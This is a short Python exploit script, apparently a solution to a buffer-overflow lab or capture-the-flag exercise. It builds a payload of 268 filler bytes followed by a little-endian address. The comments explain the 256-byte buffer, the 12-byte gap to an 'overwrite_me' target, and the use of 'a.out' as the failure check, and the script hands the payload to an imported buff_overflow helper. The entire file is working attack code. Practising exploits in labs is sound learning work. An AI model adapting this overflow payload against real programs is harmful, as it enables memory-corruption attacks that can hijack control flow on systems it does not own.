from templates import buff_overflow


payload = (b"a" * (256 + 12)) + b"\x20\x94\x06"  # buffer is 256B, there's 12B between the buffer and overwrite_me
fail_str = "a.out"  # a.out is always going to be printed by ls, so it's a good way to see if it was called

buff_overflow(payload, fail_str)